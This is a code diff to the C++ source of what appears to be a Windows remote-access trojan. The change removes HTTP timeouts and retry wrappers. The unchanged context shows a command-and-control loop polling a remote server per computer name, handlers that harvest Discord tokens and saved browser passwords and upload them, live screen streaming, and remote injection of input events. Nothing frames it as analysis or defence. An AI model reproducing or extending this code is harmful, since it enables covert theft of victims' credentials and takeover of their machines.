@@ -49,7 +49,7 @@ std::string getTimestamp() {
 std::string httpsPost(const std::string& path, const std::string& body) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "err";
-    WinHttpSetTimeouts(s, 5000, 5000, 5000, 5000);
+
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
     if (!c) { WinHttpCloseHandle(s); return "err"; }
     HINTERNET r = WinHttpOpenRequest(c, L"POST", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
@@ -66,7 +66,7 @@ std::string httpsPost(const std::string& path, const std::string& body) {
 std::string httpsPut(const std::string& path, const std::string& body) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "err";
-    WinHttpSetTimeouts(s, 5000, 5000, 5000, 5000);
+
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
     if (!c) { WinHttpCloseHandle(s); return "err"; }
     HINTERNET r = WinHttpOpenRequest(c, L"PUT", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
@@ -83,7 +83,7 @@ std::string httpsPut(const std::string& path, const std::string& body) {
 std::string httpsPatch(const std::string& path, const std::string& body) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "err";
-    WinHttpSetTimeouts(s, 5000, 5000, 5000, 5000);
+
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
     if (!c) { WinHttpCloseHandle(s); return "err"; }
     HINTERNET r = WinHttpOpenRequest(c, L"PATCH", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
@@ -100,7 +100,7 @@ std::string httpsPatch(const std::string& path, const std::string& body) {
 std::string httpsGet(const std::string& path) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "";
-    WinHttpSetTimeouts(s, 5000, 5000, 5000, 5000);
+
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
     if (!c) { WinHttpCloseHandle(s); return ""; }
     HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
@@ -116,7 +116,7 @@ std::string httpsGet(const std::string& path) {
 std::string httpsDelete(const std::string& path) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "err";
-    WinHttpSetTimeouts(s, 5000, 5000, 5000, 5000);
+
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
     if (!c) { WinHttpCloseHandle(s); return "err"; }
     HINTERNET r = WinHttpOpenRequest(c, L"DELETE", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
@@ -130,7 +130,7 @@ std::string httpsDelete(const std::string& path) {
 std::string httpsGetUrl(const std::string& host, const std::string& path) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "";
-    WinHttpSetTimeouts(s, 5000, 5000, 5000, 5000);
+
     HINTERNET c = WinHttpConnect(s, std::wstring(host.begin(),host.end()).c_str(), 443, 0);
     if (!c) { WinHttpCloseHandle(s); return ""; }
     HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
@@ -143,51 +143,8 @@ std::string httpsGetUrl(const std::string& host, const std::string& path) {
     return out;
 }
 
-// Retry wrapper: tries 3 times with 1s backoff
-std::string httpsGetRetry(const std::string& path) {
-    for (int i = 0; i < 3; i++) {
-        std::string r = httpsGet(path);
-        if (!r.empty() && r != "err") return r;
-        Sleep(1000);
-    }
-    return "";
-}
-std::string httpsPatchRetry(const std::string& path, const std::string& body) {
-    for (int i = 0; i < 3; i++) {
-        std::string r = httpsPatch(path, body);
-        if (!r.empty() && r != "err") return r;
-        Sleep(1000);
-    }
-    return "";
-}
-std::string httpsPostRetry(const std::string& path, const std::string& body) {
-    for (int i = 0; i < 3; i++) {
-        std::string r = httpsPost(path, body);
-        if (!r.empty() && r != "err") return r;
-        Sleep(1000);
-    }
-    return "";
-}
-std::string httpsPutRetry(const std::string& path, const std::string& body) {
-    for (int i = 0; i < 3; i++) {
-        std::string r = httpsPut(path, body);
-        if (!r.empty() && r != "err") return r;
-        Sleep(1000);
-    }
-    return "";
-}
-std::string httpsDeleteRetry(const std::string& path) {
-    for (int i = 0; i < 3; i++) {
-        std::string r = httpsDelete(path);
-        if (r.empty()) return r; // delete returns empty on success
-        Sleep(1000);
-    }
-    return "";
-}
-
 std::string getPublicIP() {
-    std::string r;
-    for (int i = 0; i < 3 && r.empty(); i++) { r = httpsGetUrl("api.ipify.org", "/"); Sleep(500); }
+    std::string r = httpsGetUrl("api.ipify.org", "/");
     if(r.empty()) r = httpsGetUrl("icanhazip.com", "/");
     while(!r.empty()&&(r.back()=='\n'||r.back()=='\r')) r.pop_back();
     return r.empty()?"unknown":r;
@@ -819,7 +776,7 @@ void sendPing() {
         "\"uptime\":" + std::to_string(GetTickCount64() / 1000) + ","
         "\"version\":\"2.0\""
         "}";
-    httpsPutRetry("/pings/" + fbEsc(computerName) + ".json", body);
+    httpsPut("/pings/" + fbEsc(computerName) + ".json", body);
 }
 
 std::string listProcesses() {
@@ -1528,7 +1485,7 @@ DWORD WINAPI pollThread(LPVOID) {
         if(++pingCtr>=300){pingCtr=0;try{if(!g_noPing)sendPing();}catch(...){}}
         try {
             std::string path = "/commands/" + fbEsc(computerName) + ".json";
-            std::string resp = httpsGetRetry(path);
+            std::string resp = httpsGet(path);
             if (resp.empty() || resp == "null" || resp.size() < 5) continue;
             size_t pos = 0;
             while ((pos = resp.find("\":{", pos)) != std::string::npos) {
@@ -1607,7 +1564,7 @@ DWORD WINAPI pollThread(LPVOID) {
                             auto* d = (std::pair<std::string,std::string>*)p;
                             std::string r = jsonEscape(getDiscordTokens());
                             std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
-                            httpsPatchRetry("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
+                            httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
                             delete d;
                             } catch(...) {}
                             return 0;
@@ -1620,7 +1577,7 @@ DWORD WINAPI pollThread(LPVOID) {
                             auto* d = (std::pair<std::string,std::string>*)p;
                             std::string r = jsonEscape(getBrowserPasswords());
                             std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
-                            httpsPatchRetry("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
+                            httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
                             delete d;
                             } catch(...) {}
                             return 0;
@@ -1653,7 +1610,7 @@ DWORD WINAPI pollThread(LPVOID) {
                 } catch(...) { result = "exec_err"; }
                 std::string escaped = jsonEscape(result);
                 std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
-                httpsPatchRetry("/commands/" + fbEsc(computerName) + "/" + key + ".json", resBody);
+                httpsPatch("/commands/" + fbEsc(computerName) + "/" + key + ".json", resBody);
                 pos = objEnd;
             }
         } catch(...) {}
@@ -1673,7 +1630,7 @@ DWORD WINAPI screenThread(LPVOID) {
             std::string ts = getTimestamp();
             char scaleStr[16]; sprintf(scaleStr, "%.2f", g_liveScale);
             std::string body = "{\"r\":\"" + escaped + "\",\"t\":\"" + ts + "\",\"q\":" + std::to_string(g_liveQuality) + ",\"s\":" + std::string(scaleStr) + "}";
-            httpsPutRetry("/live/" + fbEsc(computerName) + ".json", body);
+            httpsPut("/live/" + fbEsc(computerName) + ".json", body);
         } catch(...) {}
         DWORD elapsed = GetTickCount() - t0;
         if (elapsed < 100) Sleep(100 - elapsed);
@@ -1688,7 +1645,7 @@ DWORD WINAPI inputThread(LPVOID) {
     while(true) {
         Sleep(15);
         try {
-            std::string resp = httpsGetRetry("/input/" + fbEsc(computerName) + ".json");
+            std::string resp = httpsGet("/input/" + fbEsc(computerName) + ".json");
             if (resp.empty() || resp == "null" || resp.size() < 5) continue;
             bool hasEvents = false;
             size_t pos = 0;
@@ -1715,7 +1672,7 @@ DWORD WINAPI inputThread(LPVOID) {
                 } catch(...) {}
                 pos = objEnd;
             }
-            if (hasEvents) httpsDeleteRetry("/input/" + fbEsc(computerName) + ".json");
+            if (hasEvents) httpsDelete("/input/" + fbEsc(computerName) + ".json");
         } catch(...) {}
     }
     } catch(...) {}
